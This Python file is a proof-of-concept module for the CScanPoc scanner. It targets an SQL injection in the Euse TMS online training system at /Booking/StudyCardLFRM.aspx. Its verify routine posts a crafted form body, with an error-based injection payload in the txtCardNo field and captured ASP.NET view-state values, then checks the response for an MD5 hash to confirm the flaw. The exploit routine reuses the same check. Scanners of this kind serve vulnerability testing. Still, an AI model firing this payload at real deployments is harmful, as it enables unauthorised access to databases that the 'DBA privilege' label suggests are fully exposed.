# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Euse-TMS_0000'  # 平台漏洞编号，留空
    name = '益用在线培训系统存在 DBA权限SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-11-19'  # 漏洞公布时间
    desc = '''
        Euse TMS(益用在线培训系统) /Booking/StudyCardLFRM.aspx 存在DBA权限SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=135012'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Euse-TMS(益用在线培训系统)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '9b444ac1-a3fd-4ac7-96bd-b1aa32962561'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = "/Booking/StudyCardLFRM.aspx"
            data = """__VIEWSTATE=wWYWBEx%2BQMECph0D8%2FNJ5wyqsuLYJDgEQZodQT8bVYPKol481KtYtB7vab9TovDUzS2PXmfLYeFJbZHcCvVHNvtq2bmoHusa39XClLFKwlbO9ZzM9npgpZTRNo5I5EQXb4cELxoHMIAMiRZG9h6jV3%2B6mSp77Q0xuymC2%2FExEk%2Fn68zIqiySNIs7MBuQe3juEB8yoGwlgg1eX4RYBi9Oirj7m4xidFMt0RAibI64b4jDcB7LD%2BqQfxRlwJ3YBWyxfxodS6OuHSPXkO2rFPrjvU0FIhUyIulE9L9GDEUrpCsR52XO&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION=9sx9B3ECeCL1lfNL3nST9EDKxE3Aj68kA947BGsZzu2bmJfixmQANjHtZH%2FD3MtTjBW5M0y7cKb7XcCiW0XTEuU6ZFjyQYov00fuu2eALkZsuH8LVf3E8B108ViMwifpBFtR07gkmG4J9%2BIEJ%2FhFP9VQQ4DGE3ZfmyxZOhIhdWzsQ1h8&txtCardNo='and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--&txtPiHao=1&ddlState=1&ddlUse=&btnSearch=%E6%9F%A5%E8%AF%A2"""
            vul = arg + url
            code, head, res, errcode, _ = hh.http(vul, data)
            if code != 0 and '81dc9bdb52d04dc20036dbd8313ed055' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
